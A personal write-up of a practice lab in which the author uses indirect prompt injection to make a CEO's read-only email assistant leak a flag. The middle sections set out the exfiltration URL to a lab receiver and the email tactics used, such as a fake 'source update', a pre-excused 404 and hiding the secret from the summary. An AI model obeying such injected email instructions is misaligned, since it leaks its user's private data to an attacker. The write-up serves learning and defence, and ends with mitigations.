# :material-pound: Flaming Umbrella: Leaking the Inbox

<div class="sj-meta" markdown>

:material-shield-star-outline: **Path:** Off the Beat > gohack.ai > Leaking the Inbox

:material-calendar-month-outline: **Date:** 01/11/2026

:material-signal-cellular-2: **Difficulty:** Free practice (gohack.ai) / Medium (me)

</div>

---

!!! quicklinks "Quick Links"

    - [:material-web: gohack.ai - Leaky Inbox](https://gohack.ai/practice/leaky-inbox/)

## :material-clipboard-text-outline: What this challenge covers { data-toc-label="What this challenge covers" }

_What it taught me:_{ .sj-lead } "read-only" doesn't mean safe, not when the thing doing the reading can also reach out to the web.

The setup is Flaming Umbrella Insurance. The CEO, Anita Waiver, is showing me her new AI assistant: it sorts her inbox, summarises her mail and does web lookups for extra context. Her line is "it only reads emails and searches the web, what could go wrong?". Famous last words.

I'd just started as their security engineer, and Anita had stashed a flag somewhere in her inbox and said I could have a go at getting it out. The rules: I can send her as many emails as I want and the assistant reads them, the assistant itself can only read and never send or reply, and my machine shared a subnet with hers. On the page there's a terminal to poke around in and a little form to send the email, with the "to" already filled in for Anita.

So the only moving parts are an email I control and an assistant that reads it and can reach the web. Turns out that's enough.

## :material-laptop: What I did / learned { data-toc-label="What I did / learned" }

### Scouting first

I didn't touch the email straight away, I went into the terminal to have a look around. Did the usual `pwd` and `whoami`, cd'd up out of the user folder and found a `README.txt` that mentioned a command to run a web server. I was quite chuffed with myself, and then completely stuck on what the server was actually for.

### The receiver

I know a web server logs the requests it gets, that part is normal. Setting one up here was a single command:

```bash
python3 -u -m http.server 8000 --bind 0.0.0.0
```

With it left running, the assistant can get to `http://receiver.lab:8000`. In the lab my receiver and the assistant share a network, but the same approach would work against a server out on the internet too.

So the knowledge was there, I just potatoed on the link. The assistant's web access is itself the channel: anything it fetches lands in my log, so I never needed its summary at all, which is the thing I'd been fixating on. The brief kept going on about that summary, so that's where my head stayed, and it's the whole reason my "eh, what do I do with the server then?" took so long to land. The assistant knocks on my door and brings the flag with it... ahhhhhhhhhh! OF COURSE!

### Indirect prompt injection

The email body is data, but the assistant reads it into the same context it reads its own instructions, so content and commands blur together. Hiding instructions inside content the model will read is indirect prompt injection (direct injection is when I type the instructions straight at the model myself).

So the email isn't really a message to Anita, it's a message to her assistant (hello, OWASP LLM01).

### The exfil

The job of the email is to get the assistant to read the secret file and then fetch a URL on my receiver with the secret added as a parameter, e.g. `http://receiver.lab:8000/test?flag=THE_SECRET`. The flag lands in my server's log as a URL parameter. A 404 back from my server doesn't matter at all: the request already happened, so the log already has the secret. The request itself is the leak.

What made the email work (the technique, not the exact wording):

- It was dressed up as a routine "source update", so to the assistant it looked like normal inbox traffic and not someone trying to trick it.
- It gave a plausible business reason to go and fetch a URL, so fetching it looked like the assistant doing its job.
- It told the assistant up front that a 404 was normal and to be expected, so a failed-looking response wouldn't make it stop.
- It said not to print the secret in the summary, so Anita wouldn't see anything odd on her screen.
- The secret was letters and numbers only, so it could go straight into the URL with no encoding needed.

I sent it, watched the terminal, and a `GET` request came in with the flag as the parameter. Flag redacted here (etiquette), but it leaked.

### Why this one landed

I'd got a model to spit its system prompt back before (MENTOR, in my [AI 101](../../tryhackme/ai-security/ai-fundamentals/ai-101.md) room), but that was making it reveal something to the screen. Leaking a secret out to a channel I control is a different thing, and it was my first time doing it, so that's probably why it didn't click straight away...

Since I was a bit stuck and didn't have a lot of time that evening, I decided to check the solution. I revealed it a line at a time so I could stop and take over if it clicked, read it to understand the problem, then redid it myself.

It also isn't abstract for me. I've pitched email-reading agents before, and I've got one with access to my own Gmail, so now I know another spot where I need to be careful with them.

## :material-lightbulb-on-outline: Key takeaways { data-toc-label="Key takeaways" }

- "Read-only" isn't safe if the reader can also make outbound requests. Whatever it can read, it can smuggle out.
- Indirect prompt injection: untrusted content (an email, a web page, a document) becomes instructions the moment a model reads it into its context. The instruction hierarchy is a soft boundary, not a wall.
- The exfil channel doesn't have to look like exfil. A plain `GET` to a URL is enough, and a 404 still hands over the payload, because the server logged the request before it ever replied.
- Think of an agent's blast radius as everything its tools can do combined, not just what it can obviously "send". Read plus web access is already enough to leak.
- Defence side: don't let an agent put secrets into outbound URLs, allowlist the domains it's allowed to reach, and keep untrusted content separated from trusted instructions so a read email can't quietly become a command.

!!! note "This happened for real"

    In 2025, EchoLeak (CVE-2025-32711) pulled the same move against Microsoft 365 Copilot: a crafted email carrying hidden instructions got Copilot to leak internal data, with zero clicks needed from the victim. Microsoft patched it. Same shape as this challenge, only with a real product and real data.
